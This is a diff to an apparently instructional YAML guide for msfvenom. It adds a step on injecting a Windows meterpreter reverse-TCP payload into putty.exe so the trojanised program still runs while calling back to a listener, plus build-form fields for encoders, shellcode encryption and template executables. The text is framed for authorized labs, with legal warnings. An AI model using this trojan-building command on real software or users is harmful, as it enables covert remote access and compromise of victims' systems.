@@ -431,6 +431,44 @@ flows:
             cause: "Typo or unsupported value."
             fix: "List options: --list formats / --list payloads."
             check: "Re-run with a listed value."
+      - step_id: ms8t
+        title: "Inject the payload into a real-looking executable (template injection)"
+        slot_target: ACTION_OPTIONS
+        destructive: true
+        recovery: "This produces a file that LOOKS AND RUNS like a legitimate program but secretly carries your payload — literally the trojan-creation technique. Only ever use it against software YOU wrote or own, or inside an authorized lab/engagement with a target executable explicitly in scope. Never apply this to real third-party software (installers, downloads, tools you didn't write) — doing so against a system or user you don't have written authorization for is a serious crime, not a lab exercise."
+        glossary_refs: [template_injection]
+        explanation:
+          what: "`-x <file>` uses an EXISTING executable as a template and stitches your payload into it; `-k` (--keep) makes the original program's functionality keep working, with your payload now running alongside it as a new thread — instead of your payload simply replacing the whole file."
+          why: "A bare msfvenom payload is an obviously-fake, empty program that does nothing except call home — suspicious to anyone who runs it. Wrapping it around a real, working program (so it still does its normal job) is exactly how attackers make a payload look legitimate. This is taught here so you recognise and defend against it — only ever build it yourself against something you own or are explicitly authorized to test."
+          where: "ACTION_OPTIONS; -x names the template file, -k is a flag with no value."
+        find_it: "Pick a small executable you own the rights to test with (e.g. a tool you wrote, or one explicitly included in your lab's scope) as the template. It must match the payload's architecture/platform — a 32-bit template needs a 32-bit payload."
+        command_anatomy:
+          - {token: "msfvenom", does: "the payload generator"}
+          - {token: "-p windows/x64/meterpreter/reverse_tcp", does: "the payload to inject"}
+          - {token: "LHOST=10.0.0.5 LPORT=4444", does: "where the payload calls back to"}
+          - {token: "-x putty.exe", does: "use this existing executable as the template — you supply a file you're authorized to use"}
+          - {token: "-k", does: "keep the template's original behaviour working, running the payload alongside it"}
+          - {token: "-f exe -o putty_backdoored.exe", does: "output format and filename"}
+        try_this: "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.5 LPORT=4444 -x putty.exe -k -f exe -o putty_backdoored.exe"
+        success_criteria: "putty_backdoored.exe is written and, in a lab, both runs like the original program AND opens a session when executed."
+        expected_output: |
+          [-] No platform was selected, choosing Msf::Module::Platform::Windows
+          [-] No arch selected, selecting arch: x64 from the payload
+          [*] Reading Data from putty.exe: 1305600 bytes
+          Saved as: putty_backdoored.exe
+        alternatives:
+          - trigger: "'Invalid template' or the process errors out"
+            cause: "The template's architecture/platform doesn't match the payload (e.g. a 32-bit .exe with an x64 payload), or the template file is corrupt/unusual."
+            fix: "Match -a/--platform to the template's actual architecture, or pick a plainer/simpler template executable."
+            check: "Re-run with a matching -a; try a different template file."
+          - trigger: "the resulting file works but its ORIGINAL functionality is gone"
+            cause: "-k was omitted — without it, the payload REPLACES the template's code rather than running alongside it."
+            fix: "Add -k to preserve the original program's behaviour."
+            check: "Re-run with -k; confirm the program still performs its normal function."
+          - trigger: "antivirus flags the file immediately"
+            cause: "Template injection alone is not evasion — AV/EDR commonly detects known payload signatures regardless of the wrapper."
+            fix: "This is expected and not something to 'fix' by evading detection — treat AV catching it as a successful control, not an obstacle. Encoding/packing for evasion is a separate, advanced topic with its own legal and ethical considerations."
+            check: "Not a failure — this is the defensive control working as intended."
   - flow_id: handler
     title: "multi/handler (catch the callback) (reference)"
     goal: "Listen for a reverse payload."
@@ -534,6 +572,46 @@ quick_build:
       label: "LPORT"
       type: int
       placeholder: "4444"
+    - field_id: options
+      label: "Extra datastore options"
+      type: string
+      placeholder: "EXITFUNC=thread,PrependMigrate=true  (optional, comma-separated KEY=VAL pairs)"
+      help: "Any other payload option beyond LHOST/LPORT, as KEY=VAL. Separate multiple with commas."
+    - field_id: arch
+      label: "Architecture (-a)"
+      type: string
+      placeholder: "x64, x86, ...  (optional — msfvenom --list archs to see all)"
+    - field_id: platform
+      label: "Platform (--platform)"
+      type: string
+      placeholder: "windows, linux, ...  (optional — msfvenom --list platforms to see all)"
+    - field_id: encoder
+      label: "Encoder (-e)"
+      type: string
+      placeholder: "x86/shikata_ga_nai  (optional)"
+      help: "Encoders help avoid bad characters — they are NOT reliable antivirus evasion, don't rely on them for that."
+    - field_id: iterations
+      label: "Encoder iterations (-i)"
+      type: int
+      placeholder: "e.g. 3  (optional — only applies with an encoder)"
+    - field_id: badchars
+      label: "Bad characters to avoid (-b)"
+      type: string
+      placeholder: "\\x00\\xff  (optional)"
+    - field_id: template
+      label: "Template executable (-x)"
+      type: path
+      placeholder: "putty.exe  (optional — inject the payload into this existing program)"
+      help: "Wraps the payload inside a real executable so the result looks like a legitimate program. Only ever use on files you own, in an authorized lab/engagement."
+    - field_id: keep
+      label: "Keep the template's original behaviour (-k)"
+      type: bool
+      help: "Only has an effect together with Template above — preserves the original program's functionality, running the payload alongside it instead of replacing it."
+    - field_id: encrypt
+      label: "Encrypt the raw shellcode (--encrypt)"
+      type: choice
+      choices: [aes256, base64, rc4, xor]
+      help: "Encrypts/encodes the shellcode itself (different from the Encoder field above). Optional."
     - field_id: format
       label: "Format (-f)"
       type: string
@@ -542,3 +620,8 @@ quick_build:
       label: "Output file (-o)"
       type: path
       placeholder: "payload.exe"
+    - field_id: list
+      label: "List available options instead of building (--list)"
+      type: choice
+      choices: [payloads, encoders, nops, platforms, archs, encrypt, formats, all]
+      help: "Shortcut: shows msfvenom's own list for the chosen type instead of generating a payload — ignores every other field above."
